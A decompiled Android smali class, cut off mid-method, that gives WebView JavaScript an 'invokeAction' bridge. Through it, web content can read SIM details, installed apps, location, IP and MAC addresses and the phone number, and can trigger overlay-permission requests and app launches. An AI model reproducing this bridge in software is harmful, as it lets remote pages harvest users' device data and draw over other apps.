.class public final Ld3/f;
.super Ljava/lang/Object;
.source "SourceFile"


# instance fields
.field public final a:Landroid/app/Activity;

.field public final b:Landroid/webkit/WebView;

.field public final c:Lb3/b;

.field public final d:I


# direct methods
.method public constructor <init>(Landroid/app/Activity;Landroid/webkit/WebView;)V
    .locals 2

    sget-object v0, Lf3/d;->a:Lb3/b;

    const-string v1, "getDeviceInfoVO(...)"

    invoke-static {v0, v1}, Li3/f;->j(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v1, "activity"

    invoke-static {p1, v1}, Li3/f;->k(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Ld3/f;->a:Landroid/app/Activity;

    iput-object p2, p0, Ld3/f;->b:Landroid/webkit/WebView;

    iput-object v0, p0, Ld3/f;->c:Lb3/b;

    const/4 p1, 0x1

    iput p1, p0, Ld3/f;->d:I

    return-void
.end method

.method public static a(Landroid/app/Activity;Ljava/lang/String;)V
    .locals 1

    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string p1, "ct_package"

    invoke-virtual {v0, p1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    if-eqz p1, :cond_0

    const/high16 v0, 0x4000000

    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, p1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    :cond_0
    new-instance p1, Lk0/a;

    const/4 v0, 0x1

    invoke-direct {p1, p0, v0}, Lk0/a;-><init>(Landroid/app/Activity;I)V

    invoke-virtual {p0, p1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    :goto_0
    return-void
.end method


# virtual methods
.method public final invokeAction(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 12
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    const-string v0, "action"

    invoke-static {p1, v0}, Li3/f;->k(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "params"

    invoke-static {p2, v0}, Li3/f;->k(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result v0

    const/4 v1, 0x0

    sparse-switch v0, :sswitch_data_0

    goto/16 :goto_2a

    :sswitch_0
    const-string p2, "simlist"

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-nez p2, :cond_0

    goto/16 :goto_2a

    :cond_0
    iget-object p2, p0, Ld3/f;->a:Landroid/app/Activity;

    const-string v0, "android.permission.READ_PHONE_STATE"

    invoke-static {p2, v0}, Ll0/f;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    if-eqz v1, :cond_1

    filled-new-array {v0}, [Ljava/lang/String;

    move-result-object v0

    const/16 v1, 0x3e9

    invoke-static {p2, v0, v1}, Lk0/f;->b(Landroid/app/Activity;[Ljava/lang/String;I)V

    goto/16 :goto_2a

    :cond_1
    const-string v0, "phone"

    invoke-virtual {p2, v0}, Landroid/app/Activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p2

    const-string v0, "null cannot be cast to non-null type android.telephony.TelephonyManager"

    invoke-static {p2, v0}, Li3/f;->i(Ljava/lang/Object;Ljava/lang/String;)V

    check-cast p2, Landroid/telephony/TelephonyManager;

    invoke-virtual {p2}, Landroid/telephony/TelephonyManager;->getSimCountryIso()Ljava/lang/String;

    invoke-virtual {p2}, Landroid/telephony/TelephonyManager;->getSimOperatorName()Ljava/lang/String;

    goto/16 :goto_2a

    :sswitch_1
    const-string v0, "catUtrXml"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    goto/16 :goto_2a

    :cond_2
    iget-object v0, p0, Ld3/f;->a:Landroid/app/Activity;

    invoke-static {v0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v1

    if-nez v1, :cond_3

    new-instance p2, Landroid/content/Intent;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "package:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const-string v2, "android.settings.action.MANAGE_OVERLAY_PERMISSION"

    invoke-direct {p2, v2, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    iget v1, p0, Ld3/f;->d:I

    invoke-virtual {v0, p2, v1}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    goto/16 :goto_2a

    :cond_3
    invoke-static {v0, p2}, Ld3/f;->a(Landroid/app/Activity;Ljava/lang/String;)V

    goto/16 :goto_2a

    :sswitch_2
    const-string p2, "allpackages"

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-nez p2, :cond_4

    goto/16 :goto_2a

    :cond_4
    iget-object p2, p0, Ld3/f;->a:Landroid/app/Activity;

    invoke-virtual {p2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p2

    const/16 v0, 0x80

    invoke-virtual {p2, v0}, Landroid/content/pm/PackageManager;->getInstalledApplications(I)Ljava/util/List;

    move-result-object v1

    const-string p2, "getInstalledApplications(...)"

    invoke-static {v1, p2}, Li3/f;->j(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v2, "\n"

    const/4 v3, 0x0

    const/4 v4, 0x0

    sget-object v5, Ld3/d;->e:Ld3/d;

    const/16 v6, 0x1e

    invoke-static/range {v1 .. v6}, Lk4/l;->x0(Ljava/lang/Iterable;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lt4/c;I)Ljava/lang/String;

    goto/16 :goto_2a

    :sswitch_3
    const-string v0, "deviceInfo"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_5

    goto/16 :goto_2a

    :cond_5
    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result p1

    iget-object v0, p0, Ld3/f;->c:Lb3/b;

    const-string v1, "deviceId"

    if-lez p1, :cond_8

    new-instance p1, Lorg/json/JSONObject;

    invoke-direct {p1}, Lorg/json/JSONObject;-><init>()V

    const-string v2, ","

    filled-new-array {v2}, [Ljava/lang/String;

    move-result-object v2

    invoke-static {p2, v2}, Lb5/j;->i0(Ljava/lang/CharSequence;[Ljava/lang/String;)Ljava/util/List;

    move-result-object p2

    invoke-interface {p2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object p2

    :cond_6
    :goto_0
    invoke-interface {p2}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_7

    invoke-interface {p2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    invoke-static {v2, v1}, Li3/f;->f(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_6

    iget-object v3, v0, Lb3/b;->e:Ljava/lang/String;

    invoke-virtual {p1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto :goto_0

    :cond_7
    invoke-virtual {p1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "toString(...)"

    invoke-static {p1, p2}, Li3/f;->j(Ljava/lang/Object;Ljava/lang/String;)V

    goto/16 :goto_1d

    :cond_8
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string p1, "gfsId"

    :try_start_0
    new-instance p2, Lorg/json/JSONObject;

    invoke-direct {p2}, Lorg/json/JSONObject;-><init>()V

    iget-object v2, v0, Lb3/b;->e:Ljava/lang/String;

    if-eqz v2, :cond_9

    goto :goto_1

    :cond_9
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_1
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "deviceManufacturer"

    iget-object v2, v0, Lb3/b;->f:Ljava/lang/String;

    if-eqz v2, :cond_a

    goto :goto_2

    :cond_a
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_2
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "deviceModel"

    iget-object v2, v0, Lb3/b;->g:Ljava/lang/String;

    if-eqz v2, :cond_b

    goto :goto_3

    :cond_b
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_3
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "osVersion"

    iget-object v2, v0, Lb3/b;->h:Ljava/lang/String;

    if-eqz v2, :cond_c

    goto :goto_4

    :cond_c
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_4
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "sdkVersion"

    iget v2, v0, Lb3/b;->i:I

    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v1, "localIpAddress"

    iget-object v2, v0, Lb3/b;->j:Ljava/lang/String;

    if-eqz v2, :cond_d

    goto :goto_5

    :cond_d
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_5
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "networkType"

    iget-object v2, v0, Lb3/b;->k:Ljava/lang/String;

    if-eqz v2, :cond_e

    goto :goto_6

    :cond_e
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_6
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "operatorInfo"

    iget-object v2, v0, Lb3/b;->l:Ljava/lang/String;

    if-eqz v2, :cond_f

    goto :goto_7

    :cond_f
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_7
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "geoCode"

    iget-object v2, v0, Lb3/b;->m:Ljava/lang/String;

    if-eqz v2, :cond_10

    goto :goto_8

    :cond_10
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_8
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "geoLocation"

    iget-object v2, v0, Lb3/b;->n:Ljava/lang/String;

    if-eqz v2, :cond_11

    goto :goto_9

    :cond_11
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_9
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "language"

    iget-object v2, v0, Lb3/b;->o:Ljava/lang/String;

    if-eqz v2, :cond_12

    goto :goto_a

    :cond_12
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_a
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "timeZone"

    iget-object v2, v0, Lb3/b;->p:Ljava/lang/String;

    if-eqz v2, :cond_13

    goto :goto_b

    :cond_13
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_b
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "userAgent"

    iget-object v2, v0, Lb3/b;->q:Ljava/lang/String;

    if-eqz v2, :cond_14

    goto :goto_c

    :cond_14
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_c
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "os"

    iget-object v2, v0, Lb3/b;->r:Ljava/lang/String;

    if-eqz v2, :cond_15

    goto :goto_d

    :cond_15
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_d
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "selectedSimSlot"

    iget-object v2, v0, Lb3/b;->s:Ljava/lang/String;

    if-eqz v2, :cond_16

    goto :goto_e

    :cond_16
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_e
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "simId"

    iget-object v2, v0, Lb3/b;->t:Ljava/lang/String;

    if-eqz v2, :cond_17

    goto :goto_f

    :cond_17
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_f
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "wifiMac"

    iget-object v2, v0, Lb3/b;->u:Ljava/lang/String;

    if-eqz v2, :cond_18

    goto :goto_10

    :cond_18
    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    :goto_10
    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "fcmToken"

    sget-object v2, Lorg/json/JSONObject;->NULL:Ljava/lang/Object;

    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "safenetToken"

    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "place"

    iget-object v3, v0, Lb3/b;->v:Ljava/lang/String;

    if-eqz v3, :cond_19

    goto :goto_11

    :cond_19
    move-object v3, v2

    :goto_11
    invoke-virtual {p2, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "webIp"

    iget-object v3, v0, Lb3/b;->w:Ljava/lang/String;

    if-eqz v3, :cond_1a

    goto :goto_12

    :cond_1a
    move-object v3, v2

    :goto_12
    invoke-virtual {p2, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "iccid"

    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "deviceStatus"

    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "clientId"

    iget-object v3, v0, Lb3/b;->y:Ljava/lang/String;

    if-eqz v3, :cond_1b

    goto :goto_13

    :cond_1b
    move-object v3, v2

    :goto_13
    invoke-virtual {p2, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "advertisingId"

    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {p2, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-instance v1, Lorg/json/JSONArray;

    invoke-direct {v1}, Lorg/json/JSONArray;-><init>()V

    const-string v3, "users"

    invoke-virtual {p2, v3, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    iget-object v3, v0, Lb3/b;->x:Lb3/a;

    if-eqz v3, :cond_24

    const-string v4, "cpuType"

    iget-object v3, v3, Lb3/a;->e:Ljava/lang/String;

    if-eqz v3, :cond_1c

    goto :goto_14

    :cond_1c
    move-object v3, v2

    :goto_14
    invoke-virtual {v1, v4, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "memorySize"

    iget-object v4, v0, Lb3/b;->x:Lb3/a;

    iget-object v4, v4, Lb3/a;->f:Ljava/lang/String;

    if-eqz v4, :cond_1d

    goto :goto_15

    :cond_1d
    move-object v4, v2

    :goto_15
    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "storageSize"

    iget-object v4, v0, Lb3/b;->x:Lb3/a;

    iget-object v4, v4, Lb3/a;->g:Ljava/lang/String;

    if-eqz v4, :cond_1e

    goto :goto_16

    :cond_1e
    move-object v4, v2

    :goto_16
    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "batteryStatus"

    iget-object v4, v0, Lb3/b;->x:Lb3/a;

    iget-object v4, v4, Lb3/a;->h:Ljava/lang/String;

    if-eqz v4, :cond_1f

    goto :goto_17

    :cond_1f
    move-object v4, v2

    :goto_17
    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "screenResolution"

    iget-object v4, v0, Lb3/b;->x:Lb3/a;

    iget-object v4, v4, Lb3/a;->i:Ljava/lang/String;

    if-eqz v4, :cond_20

    goto :goto_18

    :cond_20
    move-object v4, v2

    :goto_18
    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "macAddress"

    iget-object v4, v0, Lb3/b;->x:Lb3/a;

    iget-object v4, v4, Lb3/a;->j:Ljava/lang/String;

    if-eqz v4, :cond_21

    goto :goto_19

    :cond_21
    move-object v4, v2

    :goto_19
    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "appVersionCode"

    iget-object v4, v0, Lb3/b;->x:Lb3/a;

    iget v4, v4, Lb3/a;->k:I

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v3, "appVersionName"

    iget-object v4, v0, Lb3/b;->x:Lb3/a;

    iget-object v4, v4, Lb3/a;->l:Ljava/lang/String;

    if-eqz v4, :cond_22

    goto :goto_1a

    :cond_22
    move-object v4, v2

    :goto_1a
    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "mobileNo"

    iget-object v4, v0, Lb3/b;->x:Lb3/a;

    iget-object v4, v4, Lb3/a;->m:Ljava/lang/String;

    if-eqz v4, :cond_23

    goto :goto_1b

    :cond_23
    move-object v4, v2

    :goto_1b
    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v3, v0, Lb3/b;->x:Lb3/a;

    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-virtual {v1, p1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-instance p1, Lorg/json/JSONArray;

    invoke-direct {p1}, Lorg/json/JSONArray;-><init>()V

    iget-object v2, v0, Lb3/b;->x:Lb3/a;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "installedApps"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-instance p1, Lorg/json/JSONArray;

    invoke-direct {p1}, Lorg/json/JSONArray;-><init>()V

    iget-object v2, v0, Lb3/b;->x:Lb3/a;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v2, "runningProcesses"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-instance p1, Lorg/json/JSONArray;

    invoke-direct {p1}, Lorg/json/JSONArray;-><init>()V

    iget-object v0, v0, Lb3/b;->x:Lb3/a;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "userAccounts"

    invoke-virtual {v1, v0, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    :cond_24
    const-string p1, "otherInfo"

    invoke-virtual {p2, p1, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {p2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1c

    :catch_0
    const-string p1, "{}"

    :goto_1c
    invoke-virtual {p1}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object p1

    :goto_1d
    return-object p1

    :sswitch_4
    const-string v0, "schemeurl"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_25

    goto/16 :goto_2a

    :cond_25
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string p2, "url"

    invoke-virtual {v0, p2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.VIEW"

    invoke-static {p2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p2

    invoke-direct {v0, v1, p2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    iget-object p2, p0, Ld3/f;->a:Landroid/app/Activity;

    invoke-virtual {p2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->resolveActivity(Landroid/content/pm/PackageManager;)Landroid/content/ComponentName;

    move-result-object v1

    if-eqz v1, :cond_38

    invoke-virtual {p2, v0}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_2a

    :sswitch_5
    const-string v0, "bankByIfsc"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_26

    goto/16 :goto_2a

    :cond_26
    const-string p1, "<br><div class=\"text6\">.*</div><br><b>Bank:</b>"

    invoke-static {p1}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object p1

    const-string v0, "compile(...)"

    invoke-static {p1, v0}, Li3/f;->j(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "https://ifsc.bankifsccode.com/"

    invoke-virtual {v0, p2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "Unexpected code "

    sget-object v3, Lf3/f;->a:Lr5/w;

    new-instance v3, Lr5/z;

    invoke-direct {v3}, Lr5/z;-><init>()V

    invoke-virtual {v3, v0}, Lr5/z;->d(Ljava/lang/String;)V

    invoke-virtual {v3}, Lr5/z;->a()Lr5/a0;

    move-result-object v0

    sget-object v3, Lf3/f;->a:Lr5/w;

    invoke-virtual {v3, v0}, Lr5/w;->b(Lr5/a0;)Lv5/j;

    move-result-object v0

    invoke-virtual {v0}, Lv5/j;->f()Lr5/d0;

    move-result-object v0

    :try_start_1
    invoke-virtual {v0}, Lr5/d0;->b()Z

    move-result v3

    if-eqz v3, :cond_29

    iget-object v2, v0, Lr5/d0;->k:Ln1/n0;

    if-eqz v2, :cond_27

    invoke-virtual {v2}, Ln1/n0;->a()Ljava/lang/String;

    move-result-object v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_1e

    :catchall_0
    move-exception p1

    goto :goto_1f

    :cond_27
    :goto_1e
    invoke-virtual {v0}, Lr5/d0;->close()V

    invoke-virtual {p1, v1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object p1

    invoke-virtual {p1}, Ljava/util/regex/Matcher;->find()Z

    move-result v0

    if-eqz v0, :cond_28

    invoke-virtual {p1}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Li3/f;->h(Ljava/lang/Object;)V

    const-string v0, ","

    filled-new-array {v0}, [Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Lb5/j;->i0(Ljava/lang/CharSequence;[Ljava/lang/String;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result v0

    const/4 v1, 0x1

    if-le v0, v1, :cond_28

    invoke-interface {p1, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p1

    move-object p2, p1

    check-cast p2, Ljava/lang/String;

    :cond_28
    return-object p2

    :cond_29
    :try_start_2
    new-instance p1, Ljava/io/IOException;

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-direct {p1, p2}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    throw p1
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :goto_1f
    :try_start_3
    invoke-virtual {v0}, Lr5/d0;->close()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto :goto_20

    :catchall_1
    move-exception p2

    invoke-virtual {p1, p2}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_20
    throw p1

    :sswitch_6
    const-string v0, "topayapp"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2a

    goto/16 :goto_2a

    :cond_2a
    iget-object v0, p0, Ld3/f;->a:Landroid/app/Activity;

    invoke-static {v0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_2b

    new-instance p2, Landroid/content/Intent;

    const-string v0, "android.settings.action.MANAGE_OVERLAY_PERMISSION"

    iget-object v1, p0, Ld3/f;->a:Landroid/app/Activity;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "package:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {p2, v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    iget-object v0, p0, Ld3/f;->a:Landroid/app/Activity;

    iget v1, p0, Ld3/f;->d:I

    invoke-virtual {v0, p2, v1}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    goto/16 :goto_2a

    :cond_2b
    iget-object v0, p0, Ld3/f;->a:Landroid/app/Activity;

    const-class v2, Ld3/c;

    monitor-enter v2

    :try_start_4
    sget-object v3, Ld3/c;->g:Ld3/c;

    if-nez v3, :cond_2c

    new-instance v3, Ld3/c;

    invoke-direct {v3, v0}, Ld3/c;-><init>(Landroid/app/Activity;)V

